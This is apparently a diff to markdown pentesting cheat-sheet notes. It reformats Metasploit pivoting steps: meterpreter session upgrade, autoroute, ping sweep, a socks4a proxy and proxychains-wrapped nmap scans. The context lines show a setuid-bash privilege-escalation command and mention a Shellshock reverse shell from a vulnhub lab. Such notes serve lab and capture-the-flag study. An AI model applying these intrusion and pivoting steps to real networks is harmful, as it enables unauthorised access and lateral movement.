@@ -103,9 +103,9 @@ chmod +s /bin/bash
 > 1. upgrade the session to meterpreter by running command --> ``` sessions -u 1 ```
 > 1. go to upgraded meterpreter session and type the autoroute command ---> ``` run autoroute -s <the network you want to access> ```
 > 1. to see if the new network is accessible, run **ping sweep* by typing command --->  ``` use -> multi/gather/ping_sweep ```. use new network and meterpreter session number.
-> 1. to set up socks4a server ---> use auxiliary/server/socks4a
-> 1. edit proxychains.conf, add sock4a proxy with 127.0.0.1 and port 1080.
-> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like ```sudo proxychains nmap --sT sC -sV -r -v -Pn <IP> ```
+> 1. to set up socks4a server ---> ```use auxiliary/server/socks4a```
+> 1. edit proxychains.conf, add ```sock4a``` proxy with 127.0.0.1 and port 1080.
+> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like ```sudo proxychains nmap -sT -sC -sV -r -v -Pn <IP> ```
   
 #### cgi-bin folder or ShellShock
 > e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
